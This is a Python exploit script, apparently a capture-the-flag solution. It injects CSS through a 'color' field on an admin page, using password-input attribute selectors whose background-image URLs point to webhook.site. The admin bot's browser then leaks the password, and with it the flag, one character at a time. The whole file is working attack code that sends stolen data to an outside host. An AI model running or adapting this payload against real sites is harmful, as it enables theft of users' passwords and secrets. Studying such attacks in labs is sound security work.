import requests
import time
import string

TARGET = "http://10.0.118.48:7777/admin"
VIEW_URL = "http://10.0.118.48:7777/view"
WEBHOOK_TOKEN = "4fee6e38-c18a-4ca9-b2ba-78f3e17bf9d2"

WEBHOOK_API = f"https://webhook.site/token/{WEBHOOK_TOKEN}/requests"
PAYLOAD = "blue;}input[type=\"password\"][value^=\"{}\"] {{background-image: url(\"https://webhook.site/{}/{}/\");}}"

charset = string.ascii_lowercase + string.ascii_uppercase + string.digits + "{}_@"

prefix = ""

def clear_webhook():
    requests.delete(f"https://webhook.site/token/{WEBHOOK_TOKEN}/requests")

def check_webhook():
    r = requests.get(WEBHOOK_API)
    data = r.json()
    if data["data"]:
        return True
    return False

def send_payload(test_prefix):
    payload = PAYLOAD.format(test_prefix, WEBHOOK_TOKEN, test_prefix)

    data = {
        "url": VIEW_URL,
        "color": payload
    }

    requests.post(TARGET, data=data)

while True:
    found = False
    for ch in charset:
        test_prefix = prefix + ch
        print(f"[+] Trying: {test_prefix}")

        clear_webhook()
        send_payload(test_prefix)

        time.sleep(2)  # wait for admin visit

        if check_webhook():
            print(f"[Y] Found: {test_prefix}")
            prefix = test_prefix
            found = True
            break

    if not found:
        print("[!] No more characters found. Final flag:", prefix)
        break